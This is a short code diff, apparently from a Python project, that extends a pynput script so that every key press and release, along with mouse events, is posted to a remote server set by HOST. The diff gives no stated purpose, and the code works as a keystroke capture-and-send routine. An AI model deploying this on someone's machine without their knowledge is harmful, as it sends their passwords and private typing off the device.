@@ -38,9 +38,33 @@ def on_scroll(x, y, dx, dy):
     })
 
 
-with pynput.mouse.Listener(
+def on_press(key):
+    try:
+        requests.post(HOST + '/press', data={
+            'key': key.char
+        })
+
+    except AttributeError:
+        requests.post(HOST + '/press', data={
+            'key': key
+        })
+
+
+def on_release(key):
+    requests.post(HOST + '/release', data={
+        'key': key
+    })
+
+
+mouseListener = pynput.mouse.Listener(
     on_move=on_move,
     on_click=on_click,
     on_scroll=on_scroll
-) as listener:
-    listener.join()
+)
+mouseListener.start()
+
+with pynput.keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release
+) as keyboardListener:
+    keyboardListener.join()
